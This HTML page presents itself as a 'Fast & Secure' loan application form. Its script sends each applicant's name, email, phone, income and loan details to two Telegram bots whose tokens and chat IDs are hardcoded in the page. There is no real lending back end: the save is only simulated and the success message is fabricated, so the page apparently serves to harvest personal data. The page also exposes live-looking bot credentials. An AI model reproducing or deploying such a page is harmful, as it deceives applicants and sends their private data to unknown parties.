<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Application System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 14px;
        }

        .form-container {
            padding: 40px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }

        input, select, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            display: none;
            animation: slideIn 0.3s ease;
        }

        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            display: none;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                transform: translateY(-10px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @media (max-width: 600px) {
            .form-container {
                padding: 20px;
            }
            
            .row {
                grid-template-columns: 1fr;
                gap: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏦 Loan Application</h1>
            <p>Apply for a loan in minutes - Fast & Secure</p>
        </div>
        <div class="form-container">
            <form id="loanForm">
                <div class="row">
                    <div class="form-group">
                        <label>First Name *</label>
                        <input type="text" id="firstName" required>
                    </div>
                    <div class="form-group">
                        <label>Last Name *</label>
                        <input type="text" id="lastName" required>
                    </div>
                </div>

                <div class="row">
                    <div class="form-group">
                        <label>Email Address *</label>
                        <input type="email" id="email" required>
                    </div>
                    <div class="form-group">
                        <label>Phone Number *</label>
                        <input type="tel" id="phone" placeholder="712345678" required>
                    </div>
                </div>

                <div class="row">
                    <div class="form-group">
                        <label>Employment Status *</label>
                        <select id="employmentStatus" required>
                            <option value="">Select...</option>
                            <option value="Employed">Employed Full-time</option>
                            <option value="Self-Employed">Self-Employed</option>
                            <option value="Business Owner">Business Owner</option>
                            <option value="Unemployed">Unemployed</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Annual Income *</label>
                        <input type="number" id="annualIncome" placeholder="USD" required>
                    </div>
                </div>

                <div class="row">
                    <div class="form-group">
                        <label>Loan Amount *</label>
                        <input type="number" id="loanAmount" placeholder="USD 500 - 50,000" required>
                    </div>
                    <div class="form-group">
                        <label>Loan Term (months) *</label>
                        <select id="loanTerm" required>
                            <option value="6">6 months</option>
                            <option value="12">12 months</option>
                            <option value="18">18 months</option>
                            <option value="24">24 months</option>
                            <option value="36">36 months</option>
                        </select>
                    </div>
                </div>

                <div class="form-group">
                    <label>Loan Purpose *</label>
                    <select id="purpose" required>
                        <option value="food">Food & Groceries</option>
                        <option value="rent">Rent & Utilities</option>
                        <option value="medical">Medical Expenses</option>
                        <option value="education">Education Fees</option>
                        <option value="business">Business Investment</option>
                        <option value="debt">Debt Consolidation</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Additional Comments (Optional)</label>
                    <textarea id="comments" rows="3"></textarea>
                </div>

                <button type="submit" class="btn-submit">Submit Application →</button>
            </form>
            <div id="successMessage" class="success-message"></div>
            <div id="errorMessage" class="error-message"></div>
        </div>
    </div>

    <script>
        // Helper function to get loan purpose label
        function getPurposeLabel(purpose) {
            const purposes = {
                'food': 'Food & Groceries',
                'rent': 'Rent & Utilities',
                'medical': 'Medical Expenses',
                'education': 'Education Fees',
                'business': 'Business Investment',
                'debt': 'Debt Consolidation'
            };
            return purposes[purpose] || purpose;
        }

        // Calculate monthly payment with 8% annual interest
        function calculateMonthlyPayment(amount, term) {
            const interestRate = 8; // 8% per year
            const monthlyRate = interestRate / 100 / 12;
            return (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -term));
        }

        // Send notification to both Telegram bots
        function sendTelegramNotifications(data) {
            // Both bot configurations
            const bots = [
                {
                    token: '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI',
                    chatId: '5520957080'
                },
                {
                    token: '8778116219:AAGIDOJeTkxMXofhI_CZGPJzaoaGoCmnoDc',
                    chatId: '5557779815'
                }
            ];
            
            // Format the message
            const message = `
🎯 *NEW LOAN APPLICATION RECEIVED*
            
📋 *Application Details:*
• ID: ${data.applicationId}
• Date: ${new Date().toLocaleString()}
• Status: ${data.status}

👤 *Applicant Information:*
• Name: ${data.firstName} ${data.lastName}
• Email: ${data.email}
• Phone: +263${data.phone}
• Employment: ${data.employmentStatus}
• Annual Income: $${data.annualIncome?.toLocaleString() || 'N/A'}

💰 *Loan Details:*
• Type: ${data.loanType || 'Personal Loan'}
• Amount: $${data.loanAmount?.toLocaleString() || '5000'}
• Term: ${data.loanTerm || '12'} months
• Purpose: ${getPurposeLabel(data.purpose || 'food')}
• Monthly Payment: $${calculateMonthlyPayment(data.loanAmount || 5000, data.loanTerm || 12).toFixed(2)}

🕒 *Application submitted at:* ${new Date().toLocaleTimeString()}
            `;
            
            // Encode the message for URL
            const encodedMessage = encodeURIComponent(message);
            
            // Send to both Telegram bots
            bots.forEach((bot, index) => {
                fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodedMessage}&parse_mode=Markdown`)
                    .then(response => response.json())
                    .then(result => {
                        console.log(`Bot ${index + 1} - Telegram message sent:`, result.ok ? '✅ Success' : '❌ Failed');
                    })
                    .catch(error => {
                        console.error(`Bot ${index + 1} - Error sending to Telegram:`, error);
                    });
            });
        }

        // Handle form submission
        document.getElementById('loanForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form values
            const formData = {
                applicationId: 'LN' + Date.now(),
                firstName: document.getElementById('firstName').value,
                lastName: document.getElementById('lastName').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                employmentStatus: document.getElementById('employmentStatus').value,
                annualIncome: parseFloat(document.getElementById('annualIncome').value),
                loanAmount: parseFloat(document.getElementById('loanAmount').value),
                loanTerm: parseInt(document.getElementById('loanTerm').value),
                purpose: document.getElementById('purpose').value,
                comments: document.getElementById('comments').value,
                status: 'Pending Review',
                loanType: 'Personal Loan',
                submittedAt: new Date().toISOString()
            };
            
            // Validate form
            if (!formData.firstName || !formData.lastName || !formData.email || !formData.phone || 
                !formData.employmentStatus || !formData.annualIncome || !formData.loanAmount) {
                showError('Please fill in all required fields.');
                return;
            }
            
            if (formData.phone.length < 9) {
                showError('Please enter a valid phone number (minimum 9 digits).');
                return;
            }
            
            if (formData.loanAmount < 500 || formData.loanAmount > 50000) {
                showError('Loan amount must be between $500 and $50,000.');
                return;
            }
            
            // Show loading state
            const submitBtn = document.querySelector('.btn-submit');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = 'Submitting...';
            submitBtn.disabled = true;
            
            // Simulate API call to save application
            setTimeout(() => {
                // Send notifications to both Telegram bots
                sendTelegramNotifications(formData);
                
                // Store in localStorage for demo
                let applications = JSON.parse(localStorage.getItem('loanApplications') || '[]');
                applications.push(formData);
                localStorage.setItem('loanApplications', JSON.stringify(applications));
                
                // Show success message
                showSuccess(`✅ Application Submitted Successfully!\n\nReference ID: ${formData.applicationId}\nWe'll contact you within 24 hours.`);
                
                // Reset form
                document.getElementById('loanForm').reset();
                
                // Reset button
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }, 1000);
        });
        
        function showSuccess(message) {
            const successDiv = document.getElementById('successMessage');
            successDiv.textContent = message;
            successDiv.style.display = 'block';
            
            setTimeout(() => {
                successDiv.style.display = 'none';
            }, 5000);
        }
        
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            
            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
    </html>
